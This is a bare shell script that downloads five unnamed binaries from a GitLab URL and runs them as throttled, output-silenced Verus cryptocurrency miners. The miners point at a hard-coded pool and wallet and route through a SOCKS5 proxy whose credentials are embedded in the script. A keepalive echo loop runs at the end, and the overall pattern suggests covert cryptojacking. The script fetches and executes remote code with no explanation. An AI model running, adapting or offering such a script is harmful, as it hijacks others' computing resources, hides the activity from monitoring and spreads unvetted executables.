apt-get update -y
apt-get install -y cpulimit screen
apt-get install -y ca-certificates wget libcurl4
wget https://gitlab.com/kancomue/file/-/raw/main/p1
wget https://gitlab.com/kancomue/file/-/raw/main/p2
wget https://gitlab.com/kancomue/file/-/raw/main/p3
wget https://gitlab.com/kancomue/file/-/raw/main/p4
wget https://gitlab.com/kancomue/file/-/raw/main/p5
chmod +x p1
chmod +x p2
chmod +x p3
chmod +x p4
chmod +x p5
pool="stratum+tcp://103.249.70.7:3300"
workername="$(echo $(shuf -i 1-100 -n 1)-gg)"
thread="$(nproc --all)"
cpulimit -l 5 ./p1 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 5 ./p2 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 5 ./p3 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 5 ./p4 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 5 ./p5 -a verus -o $pool -u DECyL1Nt3ktReAFLaqNTHp1BvxMCHxZcye.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
